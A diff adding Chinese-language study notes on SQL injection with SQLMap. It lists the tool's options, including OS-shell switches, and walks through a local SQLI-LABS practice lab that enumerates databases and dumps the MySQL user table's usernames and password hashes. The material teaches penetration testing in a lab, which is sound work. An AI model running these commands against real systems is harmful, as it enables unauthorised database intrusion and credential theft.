@@ -1,0 +1,127 @@
+# Chapter 2:  SQL注入
+
+##  2.1  SQLMap 简介
+
+SQLMap 是一个开源的渗透测试工具，用于检测和利用 SQL 注入漏洞。它可以自动化地检测和利用各种类型的 SQL 注入漏洞，包括基于时间的、基于布尔的、基于错误的和基于联合查询的注入漏洞。
+
+SQLMap 支持多种数据库管理系统，包括 MySQL、PostgreSQL、Microsoft SQL Server、Oracle、IBM DB2 和 SQLite 等。它也支持多种操作系统，包括 Windows、Linux 和 macOS 等。
+
+## 2.2 SQLMap 的用法
+
+### 2.2.1 基本用法
+
+1. 安装 SQLMap：可以从官方网站下载 SQLMap 的安装包，并按照安装指南进行安装。
+2. 扫描目标网站：使用以下命令扫描目标网站，检测 SQL 注入漏洞：
+
+```
+sqlmap -u "http://target.com/vuln.php?id=1"
+```
+
+其中，`-u` 选项指定了目标 URL。
+
+查看扫描结果：SQLMap 会显示扫描结果，包括检测到的 SQL 注入漏洞和可利用的 payload。
+
+### 2.2.2 高级用法
+
+| 功能              | 命令和参数                                          |
+| :---------------- | :-------------------------------------------------- |
+| 启动sqlmap        | sqlmap -h                                           |
+| 测试注入          | -u                                                  |
+| 爆破数据          | --dbs --tables --columns --dump                     |
+| 使用Cookie        | --cookie                                            |
+| 使用User-Agent    | --random-agent                                      |
+| 指定HTTP方法      | --methods                                           |
+| 自动识别和跳转    | --follow-redirects                                  |
+| 使用代理          | --proxy                                             |
+| 探测注入          | --level --risk                                      |
+| 数据库枚举        | -D -T -C                                            |
+| OS shell 相关操作 | --os-shell --os-pwn --os-smbrelay --os-bof          |
+| 忽略SSL/TLS认证   | --ignore-proxy --ignore-redirects --ignore-timeouts |
+| 使用Google dork   | -g                                                  |
+| 指定目标操作系统  | --os                                                |
+
+**注意**
+
+1. SQLMap 只能用于合法的渗透测试和漏洞检测，请确保您拥有足够的权限和授权。
+2. SQLMap 可能会对目标网站造成影响，请小心使用。
+
+## 2.3  SQLMap  注入实战
+
+下面以第1章安装的 SQLI-LABS 作为目标演示如何使用 SQLMap 进行注入攻击。
+### 2.3.1  定位攻击目标的ip地址
+
+本机的PowerShell管理员终端中输入
+
+ `ipconfig`
+
+得到类似下面的返回
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511110552365.png" alt="image-20240511110552365" />
+
+虚拟机的Kali 系统中输入 
+
+`ifconfig`
+
+得到类似下面的返回
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511110719689.png" alt="image-20240511110719689" />
+
+由于靶场 SQLI-LABS 安装在本机的Docker 里面，所以发起渗透的攻击机(kali linux)的IP地址是 192.168.10.128，被渗透的目标机的IP地址是192.168.111.1
+
+### 2.3.2  SQlMap 入门
+
+**1. 判断是否存在注入**
+
+`sqlmap -u http://192.168.111.1:8081/Less-1/?id=1`
+
+返回以下内容表示存在注入点
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511110929828.png" alt="image-20240511110929828" />
+
+**2. 查询当前用户下的所有数据库**
+
+`sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 --dbs` 
+
+返回数据库
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511111115363.png" alt="image-20240511111115363" />
+
+**3. 获取数据库中的表名**
+
+   `sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 -D mysql --tables` 
+
+   返回表
+
+   <img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511111416302-1715397259220-5.png" alt="image-20240511111416302" />
+
+**4. 获取表中的字段名**
+
+`sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 -D mysql -T user --columns`
+
+返回字段，其中包含 User 和 Password 
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511111521339.png" alt="image-20240511111521339" />
+
+**5. 获取字段内容**
+
+`sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 -D mysql -T user -C User,Password --dump`
+
+  返回用户名和密码
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511111600324.png" alt="image-20240511111600324" />
+
+### 2.3.3  SQlMap 进阶
+
+在获取到数据库用户表权限后，可以进行如下操作
+
+**1. 获取数据库所有用户**
+
+`sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 --users` 
+
+<img src="D:\notes\Web安全攻防渗透测试实战指南\assets\image-20240511112909573.png" alt="image-20240511112909573" />
+
+**2. 获取所有用户密码**
+
+`sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 --passwords` 
+
+![image-20240511193624649](assets/image-20240511193624649.png)
